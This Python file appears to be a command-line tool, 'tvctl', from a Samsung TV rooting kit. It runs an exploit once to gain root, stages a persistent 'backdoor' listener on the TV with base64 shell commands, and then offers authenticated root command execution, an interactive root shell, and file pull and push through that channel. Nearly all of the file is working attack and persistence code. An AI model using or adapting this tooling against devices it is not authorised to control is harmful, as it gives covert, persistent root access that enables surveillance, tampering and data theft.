"""Persistent root channel for a Samsung TV.

The TV-side component (``payload/BackdoorAgent.cs``) is a long-lived listener
started once via the archive-root exploit. After activation, every later
session connects directly to ``TV:PORT`` -- no SDB, no exploit, no Tizen
Studio -- authenticating with a shared secret that never crosses the wire.

State lives in ``state.json`` next to this file:
  - tv host, port
  - base64 shared secret (generated at activation, stored locally only)

Commands:
  activate [HOST] [--port N]   exploit once, install + start the listener
  status                        probe the listener (PING)
  exec -- COMMAND...           run one command as root, print output
  shell                         interactive root bash shell (socat pty)
  stop                          authenticated shutdown of the listener
  uninstall                     stop listener + remove files from the TV
"""

from __future__ import annotations

import argparse
import asyncio
import base64
import hashlib
import hmac
import json
import os
import shlex
import subprocess
import sys
import time
from pathlib import Path, PurePosixPath
from typing import Any


REPOSITORY = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPOSITORY / "src"))

from samsung_tv_root.archive_root import ArchiveRootError, probe  # noqa: E402
from samsung_tv_root.root_agent import (  # noqa: E402
    DEFAULT_COMMAND_TIMEOUT,
    RootAgentConnection,
    RootAgentError,
    generate_secret,
)
from samsung_tv_root.sdb import (  # noqa: E402
    SdbClient,
    SdbError,
    find_sdb,
    route_callback_host,
)


DEFAULT_PORT = 23101
STATE_DIRECTORY = Path(__file__).resolve().parent
STATE_FILE = STATE_DIRECTORY / "state.json"
PAYLOAD_DLL = STATE_DIRECTORY / "payload" / "out" / "SamsungTvBackdoorAgent.dll"
PAYLOAD_RUNTIMECONFIG = (
    STATE_DIRECTORY / "payload" / "out" / "SamsungTvBackdoorAgent.runtimeconfig.json"
)
RELEASE_PAYLOADS = (
    REPOSITORY
    / "build/tv-check/release/samsung-tv-root-0.0.9-macos-arm64/_internal/payloads"
)
REMOTE_INSTALL_DIRECTORY = "/home/owner/share/tmp/sdk_tools/samsung-tv-root-kit"
REMOTE_AGENT = f"{REMOTE_INSTALL_DIRECTORY}/SamsungTvBackdoorAgent.dll"
REMOTE_SECRET = f"{REMOTE_INSTALL_DIRECTORY}/backdoor.secret"
REMOTE_STATUS = f"{REMOTE_INSTALL_DIRECTORY}/backdoor.status"
SHELL_PORT = 22222
PROTOCOL_VERSION = "SAMSUNG-TV-ROOT/1"


class RootkitError(RuntimeError):
    pass


# ---------------------------------------------------------------------------
# State
# ---------------------------------------------------------------------------


def load_state() -> dict[str, Any]:
    try:
        value = json.loads(STATE_FILE.read_text(encoding="utf-8"))
    except FileNotFoundError as error:
        raise RootkitError(
            "no channel state; run 'tvctl activate' first"
        ) from error
    except ValueError as error:
        raise RootkitError(f"corrupt state file {STATE_FILE}: {error}") from error
    if not isinstance(value, dict) or "host" not in value or "port" not in value:
        raise RootkitError(f"corrupt state file {STATE_FILE}")
    return value


def save_state(state: dict[str, Any]) -> None:
    STATE_FILE.write_text(json.dumps(state, indent=2) + "\n", encoding="utf-8")
    os.chmod(STATE_FILE, 0o600)


def state_secret(state: dict[str, Any]) -> bytes:
    try:
        secret = base64.b64decode(state["secret"])
    except (KeyError, ValueError) as error:
        raise RootkitError("state file has no usable secret") from error
    if len(secret) < 32:
        raise RootkitError("state file secret is too short")
    return secret


# ---------------------------------------------------------------------------
# Client connection to the backdoor listener
# ---------------------------------------------------------------------------


async def open_session(
    host: str,
    port: int,
    secret: bytes,
    connect_timeout: float = 10.0,
) -> RootAgentConnection:
    """Connect to the TV listener and complete the PROOF handshake."""
    reader_writer = await asyncio.wait_for(
        # Stream limit must exceed the largest base64 chunk line (~1 MiB).
        asyncio.open_connection(host, port, limit=8 * 1024 * 1024),
        connect_timeout,
    )
    reader, writer = reader_writer
    hello = await asyncio.wait_for(reader.readline(), connect_timeout)
    fields = hello.decode("ascii", errors="replace").rstrip("\r\n").split("\t")
    if len(fields) != 2 or fields[0] != PROTOCOL_VERSION:
        writer.close()
        raise RootkitError(f"unexpected listener hello: {hello[:64]!r}")
    challenge = bytes.fromhex(fields[1])
    if len(challenge) != 32:
        writer.close()
        raise RootkitError("listener challenge has invalid length")
    proof = hmac.new(secret, challenge + b"\0" + b"PROOF", hashlib.sha256).hexdigest()
    writer.write(f"PROOF\t{proof}\n".encode("ascii"))
    await writer.drain()
    # The agent answers with an HMAC-authenticated READY frame; reuse the
    # root-agent frame verifier with the zero nonce used by --listen mode.
    from samsung_tv_root.root_agent import verify_authenticated_frame

    line = await asyncio.wait_for(reader.readline(), connect_timeout)
    payload = verify_authenticated_frame(secret, b"\0" * 32, line)
    if payload != "READY":
        writer.close()
        raise RootkitError(f"listener rejected authentication: {payload!r}")
    # RootAgentConnection expects an identity; PING refreshes it. The agent
    # reports its live identity on PING so we synthesise a placeholder here.
    connection = RootAgentConnection(
        reader,
        writer,
        secret,
        b"\0" * 32,
        identity=_PlaceholderIdentity(),
    )
    return connection


class _PlaceholderIdentity:
    pid = 0
    uid = -1
    euid = -1
    gid = -1
    egid = -1
    effective_capabilities = ""
    smack_label = ""


async def connect_state(
    state: dict[str, Any] | None = None,
    timeout: float = 10.0,
) -> RootAgentConnection:
    state = state or load_state()
    return await open_session(
        state["host"], int(state["port"]), state_secret(state), timeout
    )


# ---------------------------------------------------------------------------
# activate: exploit once, install the listener
# ---------------------------------------------------------------------------


def _docker_available() -> bool:
    return subprocess.run(
        ("docker", "version"), capture_output=True, check=False
    ).returncode == 0


def _prepare_docker_sdb() -> None:
    if os.environ.get("SDB"):
        return
    docker = subprocess.run(("docker", "ps"), capture_output=True, text=True, check=False)
    if docker.returncode != 0:
        raise RootkitError("docker is not available and SDB is not set")
    adapter = REPOSITORY / "tools/sdb_docker.py"
    os.environ["SDB"] = str(adapter)
    subprocess.run(
        ("docker", "start", "tizen-sdb"), check=True, capture_output=True
    )


def _ensure_payloads() -> None:
    if not PAYLOAD_DLL.is_file() or not PAYLOAD_RUNTIMECONFIG.is_file():
        raise RootkitError(
            f"missing built backdoor payload {PAYLOAD_DLL}; "
            "build it with the Docker command in tvctl/README.md"
        )
    common = REPOSITORY / "payloads" / "common" / "out"
    release_common = RELEASE_PAYLOADS / "common"
    if not (common / "SamsungTvArchiveRoot.dll").is_file():
        if not (release_common / "SamsungTvArchiveRoot.dll").is_file():
            raise RootkitError(
                "missing archive-root payloads; run 'make common-payload' or "
                "extract the v0.0.9 release"
            )
        os.environ["SAMSUNG_TV_ROOT_COMMON_PAYLOAD_DIRECTORY"] = str(release_common)


async def command_activate(host: str, port: int, keep_shell: bool = False) -> int:
    _prepare_docker_sdb()
    _ensure_payloads()
    if not PAYLOAD_DLL.is_file():
        raise RootkitError(f"missing payload {PAYLOAD_DLL}")
    secret = generate_secret()

    async def install(agent: RootAgentConnection) -> int:
        # The temporary callback agent only allows WRITEFILE inside its own
        # staging directory, so stage the backdoor files through EXEC with
        # base64 payloads (EXEC runs /bin/sh as unrestricted root).
        async def put_file(remote_path: str, data: bytes) -> None:
            encoded = base64.b64encode(data).decode("ascii")
            result = await agent.execute(
                f"printf '%s' '{encoded}' | base64 -d > {shlex.quote(remote_path)}",
                60.0,
            )
            if result.exit_code != 0 or result.timed_out:
                raise RootkitError(
                    f"could not stage {remote_path}: {result.stderr}{result.stdout}"
                )

        # Kill any stale listener left over from earlier activations. The
        # bracket pattern prevents pkill from matching its own command line.
        reap = await agent.execute(
            "/usr/bin/pkill -f '[S]amsungTvBackdoorAgent.dll --listen' || true",
            30.0,
        )
        if reap.timed_out:
            raise RootkitError("could not reap stale listeners before launch")
        prepare = await agent.execute(
            f"/bin/rm -rf {shlex.quote(REMOTE_INSTALL_DIRECTORY)} && "
            f"/bin/mkdir -p {shlex.quote(REMOTE_INSTALL_DIRECTORY)}",
            30.0,
        )
        if prepare.exit_code != 0 or prepare.timed_out:
            raise RootkitError(
                f"could not prepare install directory: {prepare.stderr}{prepare.stdout}"
            )
        await put_file(
            f"{REMOTE_INSTALL_DIRECTORY}/SamsungTvBackdoorAgent.dll",
            PAYLOAD_DLL.read_bytes(),
        )
        await put_file(
            f"{REMOTE_INSTALL_DIRECTORY}/SamsungTvBackdoorAgent.runtimeconfig.json",
            PAYLOAD_RUNTIMECONFIG.read_bytes(),
        )
        await put_file(REMOTE_SECRET, base64.b64encode(secret) + b"\n")
        launch = (
            f"/usr/bin/dotnet {shlex.quote(REMOTE_AGENT)} "
            f"--listen {port} {shlex.quote(REMOTE_SECRET)} "
            f">/dev/null 2>&1 &"
        )
        result = await agent.execute(launch, 30.0)
        if result.exit_code != 0 and result.exit_code != -1:
            raise RootkitError(f"listener launch failed: {result.stderr}{result.stdout}")
        await asyncio.sleep(1.5)
        # Verify the listener answers with the new secret.
        connection = await open_session(host, port, secret)
        try:
            identity = await connection.ping()
        finally:
            await connection.close()
        print(
            f"channel active on {host}:{port} "
            f"uid={identity.uid} pid={identity.pid}",
            flush=True,
        )
        # Persist local state as soon as the backdoor is verified, so a slow
        # exploit cleanup phase afterwards cannot leave the session unusable.
        save_state(
            {
                "host": host,
                "port": port,
                "secret": base64.b64encode(secret).decode("ascii"),
            }
        )
        print(f"state saved to {STATE_FILE}", flush=True)
        return 0

    # The exploit's post-session cleanup (SDB reconnect, staging removal,
    # system-file hash verification) can hang on a wedged sdbd session, and
    # its persistent capture thread blocks asyncio's default executor at
    # interpreter shutdown. Once the backdoor is verified and its state saved
    # inside the install session, none of that cleanup matters for the
    # backdoor, so exit the process directly instead of unwinding through a
    # stuck executor.
    verified = False

    async def guarded_install(agent: RootAgentConnection) -> int:
        nonlocal verified
        result = await install(agent)
        verified = True
        return result

    try:
        evidence = await asyncio.wait_for(
            probe(
                host,
                session_handler=guarded_install,
            ),
            timeout=180,
        )
    except TimeoutError:
        if verified:
            print(
                "channel verified; exploit cleanup was slow and was abandoned -- "
                "verify with 'tvctl status'",
                flush=True,
            )
            os._exit(0)
        raise
    save_state(
        {
            "host": host,
            "port": port,
            "secret": base64.b64encode(secret).decode("ascii"),
            "activated": evidence.get("uid") is not None,
        }
    )
    destination = STATE_DIRECTORY / "activation-evidence.json"
    destination.write_text(
        json.dumps(evidence, indent=2, default=str) + "\n", encoding="utf-8"
    )
    print(f"state saved to {STATE_FILE}", flush=True)
    return 0


# ---------------------------------------------------------------------------
# status / exec / shell / stop / uninstall
# ---------------------------------------------------------------------------


async def command_status(timeout: float = 10.0) -> int:
    state = load_state()
    try:
        connection = await connect_state(state, timeout)
    except (OSError, asyncio.TimeoutError, RootAgentError) as error:
        print(f"backdoor unreachable at {state['host']}:{state['port']}: {error}")
        return 1
    try:
        identity = await connection.ping()
        print(
            f"channel alive at {state['host']}:{state['port']} "
            f"uid={identity.uid} euid={identity.euid} gid={identity.gid} "
            f"pid={identity.pid} cap_eff={identity.effective_capabilities} "
            f"smack={identity.smack_label!r}"
        )
        return 0
    finally:
        await connection.close()


async def command_exec(command: list[str], timeout: float) -> int:
    state = load_state()
    connection = await connect_state(state)
    try:
        text = " ".join(command)
        result = await connection.execute(text, timeout)
        if result.stdout:
            sys.stdout.write(result.stdout)
        if result.stderr:
            sys.stderr.write(result.stderr)
        if result.timed_out:
            print("[timed out]", file=sys.stderr)
            return 124
        return result.exit_code
    finally:
        await connection.close()


async def command_shell() -> int:
    from samsung_tv_root.qn90f_shell import Qn90fRootShell, RootShellConfig

    state = load_state()
    callback = route_callback_host(state["host"])
    connection = await connect_state(state)
    try:
        return await Qn90fRootShell(
            RootShellConfig(
                tv_host=state["host"],
                allowed_host=callback,
                port=SHELL_PORT,
            )
        ).run(connection)
    finally:
        await connection.close()


# ---------------------------------------------------------------------------
# pull / push (EXEC-based, works with the already-running listener)
# ---------------------------------------------------------------------------


# Agent limits per EXEC round trip: 64 KiB command, 1 MiB captured output.
# A raw chunk of RAW_CHUNK_BYTES becomes ~1.37x as base64 on the wire, so
# 700 KiB raw stays under the 1 MiB output cap with framing headroom.
RAW_CHUNK_BYTES = 700 * 1024
EXEC_TIMEOUT = 120.0
REMOTE_SPOOL_PREFIX = "/run/samsung-tv-root/transfer-"


def _require_success(result: Any, operation: str) -> None:
    if getattr(result, "timed_out", False) or getattr(result, "exit_code", -1) != 0:
        detail = (getattr(result, "stderr", "") or getattr(result, "stdout", "")).strip()
        raise RootkitError(
            f"could not {operation}" + (f": {detail}" if detail else "")
        )


def _progress(label: str, done: int, total: int, *, force: bool = False) -> None:
    """Throttled progress line; prints immediately at most every 2 seconds
    (and always at the end, when force=True)."""
    now = time.monotonic()
    if not force and now - _progress.last < 2.0:
        return
    _progress.last = now
    percent = 100 * done // total if total else 100
    mebibytes = done / (1024 * 1024)
    total_mebibytes = total / (1024 * 1024)
    line = (
        f"{label}: {done}/{total} bytes ({percent}%, {mebibytes:.1f}/{total_mebibytes:.1f} MiB)"
    )
    if sys.stdout.isatty():
        print(f"\r{line[:79]}", end="", flush=True)
    else:
        print(line, flush=True)


_progress.last = 0.0


async def command_pull(remote: str, local: str) -> int:
    """Pull a file from the TV: base64 chunks over EXEC, sha256-verified."""
    state = load_state()
    destination = Path(local).expanduser()
    if destination.is_dir():
        destination /= PurePosixPath(remote).name
    if not destination.parent.is_dir():
        raise RootkitError(
            f"local destination directory does not exist: {destination.parent}"
        )

    connection = await connect_state(state)
    try:
        quoted = shlex.quote(remote)
        size = await connection.execute(f"wc -c < {quoted}", 30.0)
        _require_success(size, f"stat {remote}")
        total = int(size.stdout.strip())
        if total == 0:
            raise RootkitError(f"{remote} is empty")

        digest = hashlib.sha256()
        temporary = destination.with_name(f".{destination.name}.partial")
        try:
            with temporary.open("wb") as output:
                offset = 0
                while offset < total:
                    count = min(RAW_CHUNK_BYTES, total - offset)
                    chunk = await connection.execute(
                        f"dd if={quoted} bs={RAW_CHUNK_BYTES} skip={offset // RAW_CHUNK_BYTES} "
                        "count=1 2>/dev/null | base64 -w0; echo",
                        EXEC_TIMEOUT,
                    )
                    _require_success(
                        chunk, f"read chunk {offset // RAW_CHUNK_BYTES}"
                    )
                    data = base64.b64decode(chunk.stdout.strip(), validate=True)
                    if len(data) != count:
                        raise RootkitError(
                            f"chunk {offset // RAW_CHUNK_BYTES}: got {len(data)} bytes, expected {count}"
                        )
                    output.write(data)
                    digest.update(data)
                    offset += len(data)
                    _progress("pull", offset, total)
            _progress("pull", total, total, force=True)
            print()
            verify = await connection.execute(f"sha256sum {quoted}", EXEC_TIMEOUT)
            _require_success(verify, f"hash {remote}")
            expected = verify.stdout.strip().split()[0]
            observed = digest.hexdigest()
            if observed != expected:
                raise RootkitError(
                    f"digest mismatch: local {observed} != remote {expected}"
                )
            os.replace(temporary, destination)
        except BaseException:
            temporary.unlink(missing_ok=True)
            raise
        print(
            f"\npulled {remote} -> {destination} ({total} bytes, sha256 {observed[:16]}…)"
        )
        return 0
    finally:
        await connection.close()


async def command_push(local: str, remote: str) -> int:
    """Push a file to the TV: base64 chunks over EXEC, sha256-verified."""
    source = Path(local).expanduser()
    if not source.is_file():
        raise RootkitError(f"local file not found: {source}")
    data = source.read_bytes()
    if not data:
        raise RootkitError("refusing to push an empty file")

    state = load_state()
    connection = await connect_state(state)
    try:
        remote_path = PurePosixPath(remote)
        prepare = await connection.execute(
            f"mkdir -p {shlex.quote(str(remote_path.parent))}", 30.0
        )
        _require_success(prepare, f"create {remote_path.parent} on the TV")
        quoted = shlex.quote(remote)
        temporary = f"{REMOTE_SPOOL_PREFIX}{os.getpid()}"
        truncate = await connection.execute(f": > {shlex.quote(temporary)}", 30.0)
        _require_success(truncate, f"create spool {temporary}")
        try:
            offset = 0
            while offset < len(data):
                chunk = data[offset : offset + RAW_CHUNK_BYTES]
                # 700 KiB -> ~955 KB base64; within the 64 KiB EXEC command
                # limit this is NOT, so stage the payload via stdin trick:
                # split into command-sized sub-chunks appended separately.
                sub_offset = 0
                SUB_CHUNK = 48 * 1024  # base64 of 48 KiB is 64 KiB... too big
                SUB_CHUNK = 32 * 1024  # base64 of 32 KiB is ~43 KiB, fits
                while sub_offset < len(chunk):
                    sub = chunk[sub_offset : sub_offset + SUB_CHUNK]
                    encoded = base64.b64encode(sub).decode("ascii")
                    append = await connection.execute(
                        f"printf '%s' '{encoded}' | base64 -d >> {shlex.quote(temporary)}",
                        EXEC_TIMEOUT,
                    )
                    _require_success(
                        append, f"write sub-chunk at {offset + sub_offset}"
                    )
                    sub_offset += len(sub)
                offset += len(chunk)
                _progress("push", offset, len(data))
            _progress("push", len(data), len(data), force=True)
            print()
            local_digest = hashlib.sha256(data).hexdigest()
            verify = await connection.execute(
                f"sha256sum {shlex.quote(temporary)}", EXEC_TIMEOUT
            )
            _require_success(verify, "verify pushed data")
            observed = verify.stdout.strip().split()[0]
            if observed != local_digest:
                raise RootkitError(
                    f"digest mismatch on TV: {observed} != local {local_digest}"
                )
            move = await connection.execute(
                f"mv {shlex.quote(temporary)} {quoted} && chmod 644 {quoted}", 30.0
            )
            _require_success(move, f"move into place {remote}")
        except BaseException:
            await connection.execute(f"rm -f {shlex.quote(temporary)}", 30.0)
            raise
        print(
            f"\npushed {source} -> {remote} ({len(data)} bytes, sha256 {local_digest[:16]}…)"
        )
        return 0
    finally:
        await connection.close()


async def command_stop() -> int:
    state = load_state()
    connection = await connect_state(state)
    try:
        # BACKDOOR_STOP is honoured by --listen mode: BYE then process exit.
        sequence = 1
        await connection._send(f"BACKDOOR_STOP\t{sequence}")
        line = await asyncio.wait_for(connection._reader.readline(), 10.0)
        payload = line.decode().rstrip("\r\n").rsplit("\t", 1)[0]
        if payload != "BYE\t1":
            raise RootkitError(f"unexpected stop response: {payload!r}")
    finally:
        await connection.close()
    print("backdoor stopped on the TV")
    return 0


async def command_uninstall() -> int:
    state = load_state()
    try:
        await command_stop()
        await asyncio.sleep(0.5)
    except (OSError, asyncio.TimeoutError, RootAgentError, RootkitError) as error:
        print(f"(stop skipped: {error})")
    _prepare_docker_sdb()
    client = SdbClient(find_sdb(), state["host"], timeout=15)
    client.connect()
    result = client.capture(
        f"/bin/rm -rf {shlex.quote(REMOTE_INSTALL_DIRECTORY)}", timeout=15
    )
    if "[exit:0]" not in result.output:
        raise RootkitError(f"TV-side cleanup failed: {result.output.strip()}")
    STATE_FILE.unlink(missing_ok=True)
    print("backdoor files removed from the TV; local state deleted")
    return 0


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    commands = parser.add_subparsers(dest="command_name", required=True)

    activate = commands.add_parser(
        "activate", help="exploit once and install the persistent listener"
    )
    activate.add_argument("host", nargs="?", default=os.environ.get("TV_HOST"))
    activate.add_argument("--port", type=int, default=DEFAULT_PORT)

    status = commands.add_parser("status", help="ping the persistent listener")
    status.add_argument("--timeout", type=float, default=10.0)

    execute = commands.add_parser("exec", help="run one command as root on the TV")
    execute.add_argument("command", nargs=argparse.REMAINDER)
    execute.add_argument("--timeout", type=float, default=DEFAULT_COMMAND_TIMEOUT)

    commands.add_parser("shell", help="interactive root bash shell on the TV")

    pull = commands.add_parser("pull", help="copy a file from the TV")
    pull.add_argument("remote", help="absolute path on the TV")
    pull.add_argument("local", help="local destination file or directory")

    push = commands.add_parser("push", help="copy a file to the TV")
    push.add_argument("local", help="local source file")
    push.add_argument("remote", help="absolute destination path on the TV")

    commands.add_parser("stop", help="authenticated stop of the TV listener")
    commands.add_parser(
        "uninstall", help="stop the listener and remove TV-side files"
    )
    return parser


def main(argv: list[str] | None = None) -> None:
    arguments = build_parser().parse_args(argv)
    if arguments.command_name == "activate":
        if not arguments.host:
            raise SystemExit("activate: provide the TV host or set TV_HOST")
        task = command_activate(arguments.host, arguments.port)
    elif arguments.command_name == "status":
        task = command_status(arguments.timeout)
    elif arguments.command_name == "exec":
        command = [item for item in arguments.command if item != "--"]
        if not command:
            raise SystemExit("exec: provide a command")
        task = command_exec(command, arguments.timeout)
    elif arguments.command_name == "shell":
        if not sys.stdin.isatty():
            raise SystemExit("shell: run in a terminal")
        task = command_shell()
    elif arguments.command_name == "pull":
        task = command_pull(arguments.remote, arguments.local)
    elif arguments.command_name == "push":
        task = command_push(arguments.local, arguments.remote)
    elif arguments.command_name == "stop":
        task = command_stop()
    elif arguments.command_name == "uninstall":
        task = command_uninstall()
    else:  # pragma: no cover
        raise SystemExit(f"unknown command {arguments.command_name}")
    try:
        raise SystemExit(asyncio.run(task))
    except (RootkitError, ArchiveRootError, RootAgentError, SdbError) as error:
        raise SystemExit(f"tvctl: {error}") from error


if __name__ == "__main__":
    main()
